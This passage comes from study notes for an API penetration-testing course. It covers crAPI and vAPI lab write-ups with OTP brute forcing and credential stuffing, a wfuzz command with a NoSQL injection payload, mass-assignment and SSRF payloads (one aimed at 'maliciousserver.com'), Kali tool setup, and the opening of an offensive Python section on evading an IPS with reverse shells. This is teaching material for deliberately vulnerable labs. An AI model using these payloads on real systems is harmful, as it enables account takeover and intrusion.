the option that gives you this code:</p> <pre><code>pm.test(\"Status code is 200\", function () { pm.response.to.have.status(200); })\n</code></pre> <p>2. Run an unauthenticated baseline scan of the crAPI collection with the Collection Runner. Make sure that \"Save Responses\" is checked. Important. Review the results from your unauthenticated baseline scan to have an idea of how the API provider responds to requests using supported production versioning. After that, repeat the same but this time with an Authenticated user, to obtain an authenticated baseline.</p> <p>3. Next, use \"Find and Replace\" to turn the collection's current versions into a variable. For that, use Environmental variables.</p> <p>4. Run the collection with the variable set to v1, v2, v3, mobile, internal, test, uat..., and check out the different responses.</p> <pre><code>In the course, we are using the crAPI app, and by replicating these steps you can spot different code responses for the request {{base_url}}/identity/api/auth/{{var}}/check-otp.\n/v1 received a 404 Not Found\n/v2 received a 500 response\n/v3 received a 500 response\n\nAlso, body response in /v2 is different from body response in /v3: \n\nThe /v2 password reset request responds with the body (left):\n{\"message\":\"Invalid OTP! Please try again..\",\"status\":500}\n\nThe /v3 password reset request responds with the body (right):\n{\"message\":\"ERROR..\",\"status\":500}\n\nThat might be a sign of improper assets management. Going further and testing it, you can discover that /v2 does not have a limitation on the number of times we can guess the OTP. With a four-digit OTP, we should be able to brute force the OTP within 10,000 requests. Since this endpoint manages resetting passwords, in the end this vulnerability allows you to gain control on any account in the system. \n</code></pre>","tags":["api"]},{"location":"hackingapis/injection-attacks/","title":"Injection Attacks","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>The art of fuzzing is knowing which payload to send in the right request with the right tool.</p> <ul> <li>Right payload can be narrow with reconnaissance.</li> <li>Right requests are those that include user input (+ headers + url paths)</li> <li>Right tool depends on strategy in fuzzing.</li> </ul> <p>Yes, when fuzzing we need a strategy.</p> <p>1. Identify endpoints (those where client input can interact with a database).</p> <p>2. Fuzzing and analyzing responses.</p> <p>3. Analyze responses:</p> <pre><code>- Verbose error message\n- Response code\n- Time in response.\n</code></pre> <p>4. Identify technolofy, version, services behind, security controls.</p>","tags":["api"]},{"location":"hackingapis/injection-attacks/#sql-injections","title":"SQL injections","text":"<p>More aboyut SQL injectios. | How to perform a manual attack in SQL |  Simple payloads |  Tools: SQLmap</p>","tags":["api"]},{"location":"hackingapis/injection-attacks/#nosql-injections","title":"NOSQL injections","text":"<p>Simple payloads. </p> <p>API commonly use NOSQL databases due to the fact that they scale well.  These databases have unique structures, modes of querying... Requests will be alike but payloads may vary. </p>","tags":["api"]},{"location":"hackingapis/injection-attacks/#operating-system-command-injection","title":"Operating System Command Injection","text":"<p>Simple payloads</p> <p>Some common operatiing system commands that are used in Injection attacks: </p> <ul> <li>ipconfig</li> <li>dir</li> <li>ver</li> <li>whoami</li> <li>ifconfig</li> <li>ls</li> <li>pwd</li> <li>whoami</li> </ul> <p>Target:</p> <ul> <li>URL query string</li> <li>Requests parameters</li> <li>headers</li> <li>requests that throw verbose error messages </li> </ul> <p>Techniques:</p> <ul> <li>Pairing multiple commands in a single line.</li> </ul>","tags":["api"]},{"location":"hackingapis/injection-attacks/#xss-cross-site-scripting","title":"XSS  Cross-Site Scripting","text":"<p>More about Cross-Site Scripting | Simple payloads </p>","tags":["api"]},{"location":"hackingapis/injection-attacks/#using-wfuff","title":"Using wfuff","text":"<p>Having this request:</p> <pre><code>POST /community/api/v2/coupon/validate-coupon HTTP/1.1\nhost: localhost:8888\naccept: */*\norigin: http://localhost:8888\nreferer: http://localhost:8888/shop\nConnection: close\nuser-agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\ncontent-type: application/json\nContent-Length: 29\nsec-fetch-dest: empty\nsec-fetch-mode: cors\nsec-fetch-site: same-origin\nAccept-Encoding: gzip, deflate\naccept-language: en-US,en;q=0.5\nAuthorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg\nCache-Control: no-cache\nPostman-Token: 5eb2f69b-6f89-460b-a49f-96c12edc9906\n\n{\"coupon_code\":{\"$ne\":\"-1\"} }\n</code></pre> <p>And this response:</p> <pre><code>HTTP/1.1 200 OK\nServer: openresty/1.17.8.2\nDate: Mon, 06 Feb 2023 16:05:31 GMT\nContent-Type: application/json\nConnection: close\nAccess-Control-Allow-Headers: Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization\nAccess-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE\nAccess-Control-Allow-Origin: *\nContent-Length: 79\n\n{\"coupon_code\":\"TRAC075\",\"amount\":\"75\",\"CreatedAt\":\"2022-11-11T19:22:26.134Z\"}\n</code></pre> <p>We can use wfuzz like this:</p> <pre><code>wfuzz -z file,/usr/share/wordlists/nosql.txt -H \"Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg\" -H \"Content-Type: application/json\" -d \"{\\\"coupon_code\\\":FUZZ}\" --sc 200 -p localhost:8080 http://localhost:8888/community/api/v2/coupon/validate-coupon\n# -p localhost:8080 Redirect traffic to BurpSuite\n# --sc 200 Show code response 200\n</code></pre>","tags":["api"]},{"location":"hackingapis/mass-assignment/","title":"Mass assignment","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul>","tags":["api"]},{"location":"hackingapis/mass-assignment/#what-is-mass-asset-management","title":"What is mass asset management?","text":"<p>Basically UserA is said in the frontend to have the ability to post/update an object and we use that request to post/update a different object. We are sending a request that updates or overwrites server-side variables.</p> <p>Example: </p> <p>In a login process you are said to be able to send these parameters:</p> <pre><code>{\n    \"username\":\"user22\",\n    \"password\":\"Password1\",\n    }\n</code></pre> <p>But you send this:</p> <pre><code>{\n    \"username\":\"user22\",\n    \"password\":\"Password1\",\n    \"credit\":10000\n}\n</code></pre> <p>And now, your new created user will have a credit of 10,000 units.</p> <p>Other other key-values that you could include in the JSON POST body could be: </p> <pre><code>\"isadmin\": true,  \n\"isadmin\":\"true\",  \n\"admin\": 1,  \n\"admin\": true,\n</code></pre> <p>Key thing is this vulnerability is to identify vectors and entrypoints.</p>","tags":["api"]},{"location":"hackingapis/mass-assignment/#methodology","title":"Methodology","text":"<p>Identify endpoints that accept user input in your collection and that have the potential to modify objects. In the crAPI application this was about taking a BFLA to the next level:</p> <ul> <li>Changing the request \"GET /workshop/api/shop/products\" (which displays existing products) to a \"POST  /workshop/api/shop/products\", the app responded with a 400 Bad request code, and provided information with suggested fields for a POST request. Basically this post request is a way to submit requests to alter or create store products. So, we can create our own product items. </li> <li>Now we can create a product with a value in negative. Adquiring that item will give you credit!</li> </ul>","tags":["api"]},{"location":"hackingapis/mass-assignment/#finding-mass-assignment-targets","title":"Finding Mass assignment targets","text":"<p>To discover and exploit mass assignment vulnerabilities search for API requests that accept and process client input:</p> <p>1. Account registration</p> <pre><code> - Intercept the web request\n- Craft this request with admin variables that you can set from API documentation\n</code></pre> <p>2. Unauthorized access to organizations: If your user's objects belong to an organization with access to sensitive data, attempt to gain access to that organization.</p> <p>3. Resetting passwords, updating accounts, profiles or organizational objects: Do not limit yourself to the account registration process.</p>","tags":["api"]},{"location":"hackingapis/mass-assignment/#tools","title":"Tools","text":"<p>BurpSuite Intruder + Param Miner Arjun</p>","tags":["api"]},{"location":"hackingapis/mass-assignment/#using-param-miner-extension","title":"Using Param Miner extension","text":"<p>1. Spotting sections focused on privileged actions. Some headers like: </p> <pre><code>- Token: AdminToke\n-  Or in the json of the body: isadmin: true\n</code></pre> <p>A nice way to do this is with Burp Extension: Param Miner.</p> <p>Param Miner can be downloaded from BApp Store in BurpSuite. To run it, right-click on a request (for instance, a request in Repeater and select Extensions&gt;Param Miner&gt;Guess params&gt;Gues JSON parameter).</p> <p></p> <p>Now, go to Extender tab&gt; Extensions. And in the box below, select Output, and later \"Show in UI\":</p> <p></p> <p>After a while you will see results from the attack.</p> <p>With Param Miner you can:  fuzz unknown variables.</p>","tags":["api"]},{"location":"hackingapis/mass-assignment/#arjun","title":"Arjun","text":"<p>More about arjun.</p> <p>Arjun is a great tool for finding query parameters in URL endpoints.</p> <p>Advantages: - Supports GET/POST/POST-JSON/POST-XML requests.  - It deals with rate-limits and timeouts.</p> <pre><code># Run arjun againts a single URL\narjun -u https://api.example.com/endpoint\n\n# arjun will provide you with likely parameters from a wordlist. Its results are based on the deviation of response lengths/codes\narjun --headers \"Content-Type: application/json\" -u http://api.example.com/register -m JSON --include='{$arjun}' --stable\n# -m Get method parameters GET/POST/JDON/XML\n# -i Import targets (a txt list)\n# --include Specify injection point, for example:\n        #  --include='&lt;?xml&gt;&lt;root&gt;$arjun$&lt;/root&gt;\n        #  --include='{\"root\":{\"a\":\"b\",$arjun$}}'\n</code></pre> <p>Awesome wiki about arjun usage: https://github.com/s0md3v/Arjun/wiki/Usage.</p>","tags":["api"]},{"location":"hackingapis/other-labs/","title":"Setting up the labs + Writeups","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>Here we'll be practising what we have learned in the course. There are plenty of labs in the wild. My intention here is to overview only the well known ones.</p> <p>Also, to make it to the end, I will include the writeups for every lab.</p>","tags":["api"]},{"location":"hackingapis/other-labs/#setting-up-crapi","title":"Setting up crAPI","text":"<p>Download it from: https://github.com/OWASP/crAPI</p> <pre><code>mkdir ~/lab\ncd ~/lab\nsudo curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml\nsudo docker-compose pull\nsudo docker-compose -f docker-compose.yml --compatibility up -d\n</code></pre>","tags":["api"]},{"location":"hackingapis/other-labs/#setting-up-other-labs","title":"Setting up other labs","text":"<p>Besides \"crapi\" and \"vapi\", the book \"Hacking APIs\" indicates some other interesting labs. Following chapter 5 of Hacking APIs book (\"Setting up vu\u00f1nerable API targets\"), I have installed:</p>","tags":["api"]},{"location":"hackingapis/other-labs/#vapi-app","title":"vapi app","text":"<p>Source: https://github.com/roottusk/vapi</p> <p>APIs have become critical element of security landscape. In 2019, OWASP released a list of top 10 API Security vulnerabilities for the first time. Vapi stands for Vulnerable Adversely Programmed Interface, and it's a self-hostable PHP Interface that mimics OWASP API Top 10 scenarios.</p> <p>Install</p> <pre><code># Under /home/kali/labs\ngit clone https://github.com/roottusk/vapi.git\ncd vapi\ndocker-compose up -d\n# prerrequisite: having docker up and running\n</code></pre> <p>Setting up Postman</p> <ul> <li>Go to https://www.postman.com/roottusk/workspace/vapi/ </li> <li>Locate and import vAPI.postman_collection.json in Postman</li> <li>Locate and Import vAPI_ENV.postman_environment.json in Postman</li> <li>Configure the collection to use vAPI_ENV</li> </ul>","tags":["api"]},{"location":"hackingapis/other-labs/#owasp-devslop-pixi","title":"OWASP DevSlop Pixi","text":"<p>Pixi is a MongoDB, Express.js, Angular, Node (MEAN) stack web applica\u00adtion that was designed with deliberately vulnerable APIs.</p> <p>To install it:</p> <pre><code>cd ~/lab.\ngit clone https://github.com/DevSlop/Pixi.git\n</code></pre> <p>To run it:</p> <pre><code>cd ~/lab\nsudo docker-compose up\n</code></pre> <p>Now, in the browser, go to: http://localhost:8000/login</p>","tags":["api"]},{"location":"hackingapis/other-labs/#owasp-juice-shop","title":"OWASP Juice Shop","text":"<p>Juice Shop encompasses vulnerabilities from the entire OWASP Top Ten along with many other security flaws found in real-world applications.</p> <p>To install, go to the github page (https://github.com/juice-shop/juice-shop) and follow the isntructions.</p> <p>To run it:</p> <pre><code>sudo docker run --rm -p 3000:3000 bkimminich/juice-shop\n</code></pre> <p>Now, in the browser, go to: http://localhost:3000/#/</p>","tags":["api"]},{"location":"hackingapis/other-labs/#damn-vulnerable-graphql-application","title":"Damn-Vulnerable-GraphQL-Application","text":"<p>Damn Vulnerable Web Services is a vulnerable application with a web service and an API that can be used to learn about webservices/API related vulnerabilities.</p> <p>To install, see the github page: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application </p> <p>To run it:</p> <pre><code>sudo docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dvga\n</code></pre> <p>Now, in the browser, go to: http://localhost:5013/</p>","tags":["api"]},{"location":"hackingapis/other-labs/#writeups","title":"Writeups","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#vapi-writeup","title":"VAPI Writeup","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api1","title":"Writeup: API1","text":"<p>Tip provided by vAPI: Broken Object Level Authorization. You can register yourself as a User , Thats it ....or is there something more?</p> <p>Solution:</p> <ul> <li>Postman: Under folder API0, send a request to Create User. When done, the vAPI_ENV will be filled with two more variables: api1_id, api1_auth.</li> <li>Postman: Under folder API1, send a request to Get User. Initially you will get the user that you have created. BUT if you modify the api1_id in the vAPI_ENV environment, then you will receive the data from (let's say) user with id 1. Or 2. Or 3. Or... Tadam! BOLA.</li> <li>The flag is in user with id 1. See the response body:  </li> </ul>","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api2","title":"Writeup: API2","text":"<p>Tip provided by vAPI: Broken Authentication. We don't seem to have credentials for this , How do we login? (There's something in the Resources Folder given to you).</p> <p>Solution:</p> <ul> <li>Download creds.csv from https://raw.githubusercontent.com/roottusk/vapi/master/Resources/API2_CredentialStuffing/creds.csv.</li> <li>Execute:</li> </ul> <pre><code>cat creds.csv | cut -d, -f1 &gt;users.txt\ncat creds.csv | cut -d, -f3 &gt;pass.txt\n</code></pre> <ul> <li>Intercept in mode ON in Burp, enable foxyproxy at 8080 in the browser, and enable proxy in Postman at 8080.</li> <li>Postman: Under  folder API2, send a POST request to login and intercept it with Burp.</li> <li>Burp: send the request to Intruder. Use Pitchfork attack with two payloads (Simplelist). One will be users.txt and second payload, pass.txt. Careful, remove the url encoding when setting up the payloads.</li> <li>Burp: sort by Code (or length). You will get credentials for three users.</li> <li>Postman: Login with the credentials of every user and save the file as an example just in case that you need to go back to this.</li> <li>Postman: Once you are login into the app, a new enviromental variable has been saved in vAPI_ENV: api2_auth. With this authentication now we can resend the request Get Details. Flag will be in the response.</li> </ul>","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api3","title":"Writeup: API3","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api4","title":"Writeup: API4","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api5","title":"Writeup: API5","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api6","title":"Writeup: API6","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api7","title":"Writeup: API7","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api8","title":"Writeup: API8","text":"","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api9","title":"Writeup: API9","text":"<p>On this lab we'll be testing for improper asset management. The endpoint provided in the Postman collection is:</p> <p></p> <p>Several interesting things to test:</p> <ul> <li>Only a pin code with 4 digits are required to login.</li> <li>We are running this request using version2 of an api.</li> <li>There are two significant headers:<ul> <li>X-RateLimit-Limit set to 5</li> <li>X-RateLimit Remaining set to 4.</li> </ul> </li> </ul> <p>With this in mind we can run that request six times, obtaining a 500 internal server error instead of the 200 response:</p> <p></p> <p>But, if we run the same request but modifying the POST request from v2 to v1, then:  </p> <p>Headers \"X-RateLimit-Limit\" and \"X-RateLimit Remaining\" are missing. Looks like there is no Rate limit set for this request and a Brute Force attack can be conducted. So we do it using Burp Intruder and... bingo! we have the flag:</p> <p></p>","tags":["api"]},{"location":"hackingapis/other-labs/#writeup-api10","title":"Writeup: API10","text":"","tags":["api"]},{"location":"hackingapis/scanning-apis/","title":"Scanning APIs","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>Once you have discovered an API and used it as it was intended, you can proceed to perform a baseline vulnerability scan. Most of these scans return false-negative results (because they are web-oriented)  but they are helpful in structuring next steps.</p> <p>Basic scans you can run:</p>","tags":["api"]},{"location":"hackingapis/scanning-apis/#nikto","title":"nikto","text":"<p>You will get some results related to headers such as:</p> <ul> <li>The anti-clickjacking X-Frame-Options header is not present.</li> <li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li> <li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li> </ul> <p>Run:</p> <pre><code>nikto -h http://localhost:8888\n</code></pre>","tags":["api"]},{"location":"hackingapis/scanning-apis/#owasp-zap","title":"OWASP zap","text":"<p>To launch it, run:</p> <pre><code>zaproxy\n</code></pre> <p>You can do several things:</p> <ul> <li>Run an automatic attack.</li> <li>Import your spec.yml file and run an automatic attack.</li> <li>Run a manual attack. </li> </ul> <p>The manual explore option will allow you to perform authenticated scanning. Set the URL to your target, make sure the HUD is enabled, and choose \"Launch Browser\". </p>","tags":["api"]},{"location":"hackingapis/scanning-apis/#how-to-run-a-manual-attack","title":"How to run a manual attack","text":"<p>Select \"Continue to your target\". On the right-hand side of the HUD, you can set the Attack Mode to On. This will begin scanning and performing authenticated testing of the target. Now you  perform all the actions (sign up a new user, log  in into the account, modify you avatar, post a comment...).</p> <p>After that, OWASP Zap allows you to narrow the results to your target. How? In the Sites module, right click on your site and select \"Include in context\". After that, click on the icon shaped as a \"target\" to filter out sites by context. </p> <p>With the results, start your analysis and remove false-negative vulnerabilities.</p>","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/","title":"SSRF attack - Server side Request Forgery","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>This vulnerability allows an attacker to supply URLs that expose private data, scan the target's internal network, or compromise the target through remote code execution.</p>","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/#identify-endpoints","title":"Identify endpoints","text":"<p>Read your collection throughfully and search for requests that:</p> <ul> <li>Include full URLs in the POST body or parameters</li> <li>Include URL paths (or partial URLs)\u00a0in the POST body or parameters</li> <li>Headers that include URLs like Referer</li> <li>Allows for user input that may result in a server retrieving resources</li> </ul>","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/#ssrf-types","title":"SSRF types","text":"","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/#in-band-ssrf","title":"In-Band SSRF","text":"<p>A URL is specified as an attack. The request is sent and the content of your supplied URL is displayed back to you in a response.</p> <p>A possible endpoint:</p> <pre><code>{\n    \"inventory\":\"http://store.com/api/v3/inventory/item/12345\"\n}\n</code></pre> <p>SSRF code:</p> <pre><code>{\n    \"inventory\":\"http://maliciousserver.com\"\n}\n</code></pre>","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/#blind-ssrf","title":"Blind  SSRF","text":"<p>It's similar to In-Band attack. In this case, the response is returned and we do not have any indication that the server is vulnerable:</p> <pre><code>HTTP/1.1 200 OK  \nheaders...  \n{}\n</code></pre> <p>But, there is a way to test it. Burp Suite Pro has a great tool called Burp Suite Collaborator. Collaborator can be leveraged to set up a web server that will provide us with the details of any requests that are made to our random URL.</p>","tags":["api"]},{"location":"hackingapis/server-side-request-forgery-ssrf/#tools-to-test-blind-ssrf","title":"Tools to test Blind SSRF","text":"<p>Free:</p> <ul> <li>https://webhook.site</li> <li>http://pingb.in/ </li> <li>https://requestbin.com/ </li> <li>https://canarytokens.org/</li> </ul> <p>Paid:</p> <ul> <li>Burp Collaborator. </li> </ul>","tags":["api"]},{"location":"hackingapis/setting-up-kali/","title":"Setting up the environment","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>For this course, I'll use a Kali machine installed on VirtualBox. I downloaded last .ova version, 2022-3. </p> <p>After that, follow these steps:</p>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#1-install-a-kali-ova-on-virtualbox","title":"1. Install a kali ova on VirtualBox","text":"<p>For this course I've downloaded a Kali .ova machine. I will be using VirtualBox and I will modify these elements in the ova installation:</p> <ul> <li>4GB RAM</li> <li>Bridge mode Interface</li> </ul>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#2-update-our-system","title":"2.  Update our system","text":"<pre><code>sudo apt update -y\nsudo apt upgrade -y\nsudo apt-dist upgrade -y\n</code></pre> <p>Also, update credentials:</p> <pre><code>sudo passwd kali\u00a0 \u00a0 (enter in a new more complex password)\nsudo useradd -m hapihacker\nsudo usermod -a -G sudo hapihacker\nsudo chsh -s /bin/zsh hapihacker\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#3-install-burp-suite-and-make-sure-that-is-up-to-date","title":"3. Install Burp Suite and make sure that is up-to-date.","text":"<pre><code>sudo apt-get install burpsuite -y\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#4-adding-extension-authorize-extension-to-burpsuite-this-will-require-to-have-jython-installed","title":"4.  Adding extension Authorize extension to BurpSuite: this will require to have Jython installed.","text":"<ol> <li>Download jython from: https://www.jython.org/download.html and add the .jar file to the Extender Options.</li> <li>Under the Extender BApp Store search for Autorize and install the extension.</li> </ol>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#5-install-foxy-proxy-in-firefox-to-proxy-the-traffic-to-burpsuite-and-postman-once-intalled-well-set-up-manually-two-proxies","title":"5. Install Foxy-proxy in Firefox to proxy the traffic to BurpSuite and Postman.  Once intalled, we'll set up manually two proxies","text":"<ol> <li>Postman - 127.0.0.1 - 5555</li> <li>BurpSuite - 127.0.0.1 - 8080.</li> </ol> <p>Download BurpSuite certificate and have it installed in Firefox. </p>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#6-mitmweb-certificate-setup","title":"6. MITMweb certificate setup","text":"<ol> <li>Install mitmweb from the terminal:</li> </ol> <pre><code>mitmweb\n</code></pre> <p>We need to make sure that Burpsuite is stopped, since mitmweb is also going to use port 8080.</p> <ol> <li> <p>Activate FoxyProxy in Firefox to send traffic \u00a0to the BurpSuite proxy (8080).</p> </li> <li> <p>Download mitmproxy-ca-cert.pem from mitm.it (in Firefox) and have it installed in Firefox.</p> </li> </ol>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#7-install-postman","title":"7. Install Postman","text":"<pre><code>sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz &amp;&amp;\u00a0sudo tar -xvzf postman-linux-x64.tar.gz -C /opt &amp;&amp;\u00a0sudo ln -s /opt/Postman/Postman /usr/bin/postman\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#8-install-mitmproxy2swagger","title":"8.  Install mitmproxy2swagger","text":"<pre><code>cd /opt\nsudo pip3 install mitmproxy2swagger\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#9-install-git","title":"9. Install git","text":"<pre><code>cd /opt\nsudo apt-get install git\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#10-install-docker","title":"10. Install docker","text":"<pre><code>cd /opt\nsudo apt-get install docker.io docker-compose\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#11-install-go","title":"11. Install Go","text":"<pre><code>cd /opt\nsudo\u00a0apt install golang-go\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#12-install-json-web-token-toolkit-v2","title":"12. Install  JSON Web Token Toolkit v2","text":"<pre><code>cd /opt\nsudo git clone\u00a0https://github.com/ticarpi/jwt_tool\ncd jwt_tool\npython3 -m pip install termcolor cprint pycryptodomex requests\n\n# Optional: Make an alias for jwt_tool.py**\nsudo chmod +x jwt_tool.py\nsudo ln -s /opt/jwt_tool/jwt_tool.py /usr/bin/jwt_tool\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#13-install-kiterunner","title":"13. Install Kiterunner","text":"<pre><code>sudo git clone https://github.com/assetnote/kiterunner.git\ncd kiterunner\nsudo make build\nsudo ln -s /opt/kiterunner/dist/kr /usr/bin/kr\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#14-install-arjun","title":"14. Install Arjun","text":"<p>More about arjun.</p> <pre><code>sudo git clone\u00a0https://github.com/s0md3v/Arjun.git\n</code></pre>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#15-install-owasp-zap","title":"15.  Install OWASP ZAP","text":"<pre><code>sudo apt install zaproxy\n</code></pre> <p>Run ZAP and open the \"Manage Add-ons\" option and make sure that  the add-on \"OpenAPI Support\" is marked to be updated.</p>","tags":["api"]},{"location":"hackingapis/setting-up-kali/#16-have-these-useful-wordlist-api-oriented","title":"16.  Have these useful wordlist API oriented","text":"<pre><code># SecLists https://github.com/danielmiessler/SecLists\nsudo\u00a0wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \\  \n&amp;&amp; sudo unzip SecList.zip \\  \n&amp;&amp; sudo rm -f SecList.zip\n\n# Hacking-APIs https://github.com/hAPI-hacker/Hacking-APIs\nsudo\u00a0wget -c\u00a0https://github.com/hAPI-hacker/Hacking-APIs/archive/refs/heads/main.zip\u00a0-O HackingAPIs.zip \\  \n&amp;&amp; sudo unzip HackingAPIs.zip \\  \n&amp;&amp; sudo rm -f HackingAPIs.zip\n</code></pre>","tags":["api"]},{"location":"python/bypassing-ips-with-handmade-xor-encryption/","title":"Bypassing IPS with handmade XOR Encryption","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>The idea is to encrypt our traffic to avoid network analyzers or intrusion prevention sensors. SSL or SSH is not recommended here since Next Generation Firewalls have the ability to decrypt them and pass it as plain text to the IPS, where it will be recognized.</p> <ul> <li>Create a secret key of 1Kb that matches the size of the socket, to make a XOR operation to encrypt the message</li> </ul> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\n# The random and string libraries are used to generate a random string with flexible criteria\nimport string\nimport random\n\n\n# Random Key Generator\nkey = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\\\') for _ in range(0, 1024))\n\n\nprint(key)\n\nprint (\"\\n\" + \"Key length = \" + str(len(key)))\n\nmessage = 'ipconfig'\nprint(\"Msg: 